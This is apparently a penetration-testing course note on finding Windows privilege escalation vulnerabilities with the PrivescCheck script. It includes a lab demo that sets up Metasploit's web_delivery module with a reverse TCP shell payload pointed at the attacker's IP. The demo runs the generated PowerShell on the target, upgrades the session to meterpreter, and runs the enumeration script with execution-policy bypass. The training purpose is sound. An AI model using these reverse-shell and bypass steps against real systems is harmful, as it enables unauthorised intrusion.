---
description: https://github.com/itm4n/PrivescCheck
---

# Identifying Windows Privilege Escalation Vulnerabilities

In order to elevate your privs on Windows, you mumst first, identify priv esc vulnerabilities that exist on the target system.

This process will differ greatly based on the type of target you gain access to. Privilege escalation on Windows can be performed through a plethora of techniques based on the version of Windows and the system's unique configuration.

This process can be quite tedious and time consuming and as a result it is recommended to automate the processes of identifying priv esc vulns. This can be done through the use of various automation scripts.

## &#x20;PrivescCheck

<mark style="color:red;">PrivescCheck</mark> - This script aims to enumerate common Windows configuration issues that can be leveraged for local privilege escalation. It also gathers various information that might be useful for exploitation and/or post-exploitation.

* GitHub Repo: https://github.com/itm4n/PrivescCheck

## Practice Demo

Enumerate the target.

The target doesn't have any vulnerable services running on it.

We are gonna use the module:

* <mark style="color:yellow;">exploit/multi/script/web\_delivery:</mark> Quickly fires a web server that serves a payload. It creates a payload having in mind the target system, we run that code in the target and it automatically downloads the payload.

#### Options

* <mark style="color:yellow;">set target PSH\ (Binary)</mark>
* <mark style="color:yellow;">set payload windows/shell/reverse\_tcp</mark>
* <mark style="color:yellow;">set PSH-EncodedCommand false</mark>
* <mark style="color:yellow;">set LHOST 'ourIP'</mark>

Run.

Copy the Powershell code that is generated, and run it on the target machine cmd.

We get a shell session on our attacker machine, as the student user.

We finally use the post/multi/manage/shell\_to\_meterpreter module to upgrade our session to a meterpreter session.

#### Options

* <mark style="color:yellow;">set WIN\_TRANSFER VBS</mark>

Run.

### Privilege Escalation

Go to the "<mark style="color:red;">PrivescCheck</mark>" directory in the desktop.

https://github.com/itm4n/PrivescCheck <mark style="color:red;">(See the repo for info on how to run)</mark>

In this case since we have a cmd session we will run

* <mark style="color:yellow;">powershell -ep bypass  -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"</mark>

It runs the script, and now we can go through the output to see all vulns.





